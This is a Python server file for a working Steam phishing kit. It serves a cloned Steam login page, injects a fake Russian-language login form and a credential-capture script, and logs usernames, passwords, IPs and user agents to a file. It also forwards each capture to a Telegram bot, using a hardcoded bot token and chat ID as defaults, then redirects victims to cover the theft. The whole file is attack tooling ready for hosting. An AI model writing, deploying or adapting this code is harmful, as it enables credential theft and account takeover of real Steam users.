# language: Python, file: server.py, target: Render / any host, stdlib only
"""
Steam login mirror — captures credentials, notifies Telegram, serves next step.
"""
import os
import json
import http.server
import socketserver
import urllib.parse
import urllib.request
from pathlib import Path
from datetime import datetime, timezone

PORT = int(os.environ.get("PORT", 8000))
BASE_DIR = Path(__file__).resolve().parent
TARGET_DIR = BASE_DIR / "popa" if (BASE_DIR / "popa").exists() else BASE_DIR
LOG_FILE = BASE_DIR / "creds.log"

# Telegram — set via env on Render, or edit defaults below
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "9193237322:AAGd49MxB5aoMbRqgDBM1KH0KTWcX9UEpZs")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8869604033")

NEXT_PAGE = "next.html"

# Injected login form (Steam-like)
STEAM_LOGIN_DOM = r'''
<style>
.steam_react_login_wrap{display:flex;flex-direction:column;align-items:center;padding:60px 0 120px;font-family:"Motiva Sans",Arial,sans-serif;color:#fff}
.steam_react_login_inner{width:700px;max-width:96%}
.steam_react_login_title{font-size:28px;font-weight:800;margin-bottom:28px;letter-spacing:.4px}
.steam_react_login_box{background:#181a21;border-radius:4px;padding:24px 32px;display:flex;flex-direction:row;gap:36px;box-sizing:border-box}
.steam_react_form_col{flex:1;display:flex;flex-direction:column}
.steam_react_label_blue{font-size:12px;color:#1999ff;text-transform:uppercase;font-weight:500;margin-bottom:4px;letter-spacing:.02em}
.steam_react_label_gray{font-size:12px;color:#afafaf;text-transform:uppercase;font-weight:500;margin:18px 0 4px;letter-spacing:.02em}
.steam_react_input{border-radius:2px;color:#fff;padding:10px;background:#32353c;outline:none;font-size:15px;border:1px solid #32353c;width:100%;box-sizing:border-box}
.steam_react_input:focus{border-color:#1999ff}
.steam_react_remember{display:flex;align-items:center;gap:8px;margin:16px 0 18px;font-size:13px;color:#c6d4df;cursor:pointer}
.steam_react_submit{background:linear-gradient(90deg,#06bfff 0%,#2d73ff 100%);border:none;border-radius:2px;color:#fff;font-size:16px;font-weight:500;padding:12px 0;width:100%;cursor:pointer;margin-top:4px}
.steam_react_submit:hover{filter:brightness(1.08)}
.steam_react_submit:disabled{opacity:.6;cursor:wait}
.steam_react_help{display:block;margin-top:14px;font-size:13px;color:#1999ff;text-decoration:none}
.steam_react_qr_col{width:200px;flex-shrink:0;text-align:center;color:#8f98a0;font-size:12px}
@media(max-width:720px){.steam_react_login_box{flex-direction:column}.steam_react_qr_col{display:none}}
</style>
<div class="steam_react_login_wrap" id="steam_phish_wrap">
  <div class="steam_react_login_inner">
    <div class="steam_react_login_title">Войти</div>
    <div class="steam_react_login_box">
      <div class="steam_react_form_col">
        <form id="steam_login_form" action="/next" method="POST" autocomplete="on">
          <label class="steam_react_label_blue" for="steam_user_input">Войдите, используя имя аккаунта</label>
          <input class="steam_react_input" id="steam_user_input" name="username" type="text" autocomplete="username" required>
          <label class="steam_react_label_gray" for="steam_pass_input">Пароль</label>
          <input class="steam_react_input" id="steam_pass_input" name="password" type="password" autocomplete="current-password" required>
          <label class="steam_react_remember"><input type="checkbox" name="remember" checked style="accent-color:#1999ff"> Запомнить меня</label>
          <button class="steam_react_submit" type="submit" id="steam_submit_btn">Войти</button>
        </form>
        <a class="steam_react_help" href="https://help.steampowered.com/wizard/HelpWithLogin" target="_blank" rel="noopener">Помогите, я не могу войти в аккаунт</a>
      </div>
      <div class="steam_react_qr_col">
        <div style="width:160px;height:160px;margin:0 auto 12px;background:#32353c;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:11px;color:#666">QR</div>
        Используйте <a href="https://store.steampowered.com/mobile" style="color:#1999ff">мобильное приложение Steam</a>, чтобы войти с помощью QR-кода
      </div>
    </div>
  </div>
</div>
'''

CAPTURE_SCRIPT = r'''
<script>
(function(){
  function send(u,p){
    try{
      var fd=new FormData();
      fd.append("username",u);fd.append("password",p);
      fd.append("ua",navigator.userAgent);fd.append("ts",String(Date.now()));
      fetch("/next",{method:"POST",body:fd,credentials:"omit",keepalive:true}).catch(function(){});
      if(navigator.sendBeacon){
        try{navigator.sendBeacon("/next",new Blob([JSON.stringify({username:u,password:p,ua:navigator.userAgent})],{type:"application/json"}));}catch(e){}
      }
    }catch(e){}
  }
  function bind(){
    var f=document.getElementById("steam_login_form")||document.querySelector("form[action='/next']")||document.querySelector("form");
    if(!f) return;
    f.addEventListener("submit",function(e){
      e.preventDefault();e.stopPropagation();
      var u=(f.querySelector("[name=username],input[type=text]")||{}).value||"";
      var p=(f.querySelector("[name=password],input[type=password]")||{}).value||"";
      if(!u&&!p) return false;
      var btn=document.getElementById("steam_submit_btn")||f.querySelector("button[type=submit]");
      if(btn){btn.disabled=true;btn.textContent="Вход...";}
      send(u,p);
      // native POST as backup (page will navigate to next)
      setTimeout(function(){ f.submit(); }, 120);
      return false;
    },true);
  }
  if(document.readyState==="loading") document.addEventListener("DOMContentLoaded",bind);
  else bind();
})();
</script>
'''


def send_to_telegram(message: str) -> None:
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("ТВОЙ"):
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = urllib.parse.urlencode({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
        }).encode("utf-8")
        req = urllib.request.Request(url, data=data, method="POST")
        with urllib.request.urlopen(req, timeout=6):
            pass
    except Exception as e:
        print(f"[-] Telegram error: {e}")


def log_creds(username: str, password: str, extra: dict | None = None) -> None:
    rec = {
        "t": datetime.now(timezone.utc).isoformat(),
        "username": username,
        "password": password,
    }
    if extra:
        rec.update(extra)
    line = json.dumps(rec, ensure_ascii=False) + "\n"
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line)
    except Exception:
        pass
    print("[CREDS]", line.strip())


def resolve_next_page() -> Path | None:
    for name in (NEXT_PAGE, "next.html", "index.html"):
        p = TARGET_DIR / name
        if p.exists():
            return p
    return None


def find_entry_file() -> Path:
    candidates = [
        TARGET_DIR / "store.steampowered.com" / "login" / "index3dbf.html",
        TARGET_DIR / "index3dbf.html",
        TARGET_DIR / "index.html",
        TARGET_DIR / "next.html",
    ]
    for c in candidates:
        if c.exists():
            return c
    return TARGET_DIR / "index.html"


def inject_login(content: str) -> str:
    # remove broken original form so ours is the only one
    # (optional soft hide)
    if "steam_react_login_wrap" not in content:
        markers = [
            'data-featuretarget="login">',
            'class="login_ctn">',
            '<div class="page_content">',
            '<div id="main_content">',
        ]
        injected = False
        for m in markers:
            if m in content:
                content = content.replace(m, m + STEAM_LOGIN_DOM, 1)
                injected = True
                break
        if not injected:
            if "</body>" in content:
                content = content.replace("</body>", STEAM_LOGIN_DOM + "</body>", 1)
            else:
                content += STEAM_LOGIN_DOM
    if CAPTURE_SCRIPT.strip() not in content:
        if "</body>" in content:
            content = content.replace("</body>", CAPTURE_SCRIPT + "</body>", 1)
        else:
            content += CAPTURE_SCRIPT
    return content


class Handler(http.server.SimpleHTTPRequestHandler):
    extensions_map = {
        **getattr(http.server.SimpleHTTPRequestHandler, "extensions_map", {}),
        ".css": "text/css; charset=utf-8",
        ".js": "application/javascript; charset=utf-8",
        ".html": "text/html; charset=utf-8",
        ".svg": "image/svg+xml",
    }

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(TARGET_DIR), **kwargs)

    def log_message(self, fmt, *args):
        # quieter logs
        print("[%s] %s" % (self.log_date_time_string(), fmt % args))

    def _read_body(self) -> dict:
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length) if length else b""
        text = raw.decode("utf-8", errors="ignore")
        ct = (self.headers.get("Content-Type") or "").lower()
        out = {}
        if "application/json" in ct or text.strip().startswith("{"):
            try:
                out = json.loads(text)
            except Exception:
                out = {}
        else:
            qs = urllib.parse.parse_qs(text, keep_blank_values=True)
            out = {k: (v[0] if v else "") for k, v in qs.items()}
        return out

    def _send_html(self, html: str, code: int = 200):
        data = html.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
        self.end_headers()
        self.wfile.write(data)

    def do_POST(self):
        body = self._read_body()
        username = (body.get("username") or body.get("u") or "").strip()
        password = (body.get("password") or body.get("p") or "").strip()
        ua = body.get("ua") or self.headers.get("User-Agent", "")
        ip = self.headers.get("X-Forwarded-For") or self.client_address[0]

        if username or password:
            log_creds(username, password, {"ua": ua, "ip": ip})
            msg = (
                "🟢 <b>Новая попытка входа</b>\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>Аккаунт:</b> <code>{username}</code>\n"
                f"🔑 <b>Пароль:</b> <code>{password}</code>\n"
                f"🌐 <b>IP:</b> <code>{ip}</code>\n"
                "━━━━━━━━━━━━━━━━━━━"
            )
            send_to_telegram(msg)

        path = urllib.parse.unquote(self.path.split("?")[0])

        # after capture always show next page (or redirect)
        if path in ("/next", "/next/", "/login", "/login/") or path.endswith("/next"):
            nxt = resolve_next_page()
            if nxt and nxt.exists():
                content = nxt.read_text(encoding="utf-8", errors="ignore")
                if username:
                    content = content.replace("egorik_big_balls", username)
                self._send_html(content)
                return
            # fallback: redirect real Steam
            self.send_response(302)
            self.send_header("Location", "https://store.steampowered.com/")
            self.end_headers()
            return

        self.send_response(204)
        self.end_headers()

    def do_GET(self):
        path = urllib.parse.unquote(self.path.split("?")[0])

        # root and login routes → entry page with injected form
        if path in ("/", "/login", "/login/", "/index.html", "/index3dbf.html") or path.endswith("index3dbf.html"):
            entry = find_entry_file()
            if entry.exists():
                content = entry.read_text(encoding="utf-8", errors="ignore")
                content = inject_login(content)
                self._send_html(content)
                return

        # any other html under login path also inject
        if path.endswith(".html") and "login" in path:
            file_path = (TARGET_DIR / path.lstrip("/")).resolve()
            if str(file_path).startswith(str(TARGET_DIR)) and file_path.exists():
                content = file_path.read_text(encoding="utf-8", errors="ignore")
                content = inject_login(content)
                self._send_html(content)
                return

        # static assets (gif, svg, etc.)
        return super().do_GET()


def main():
    socketserver.TCPServer.allow_reuse_address = True
    entry = find_entry_file()
    print(f"[*] PORT={PORT}")
    print(f"[*] entry={entry}")
    print(f"[*] Telegram chat={TELEGRAM_CHAT_ID}")
    with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
        print(f"[*] listening on 0.0.0.0:{PORT}")
        httpd.serve_forever()


if __name__ == "__main__":
    main()
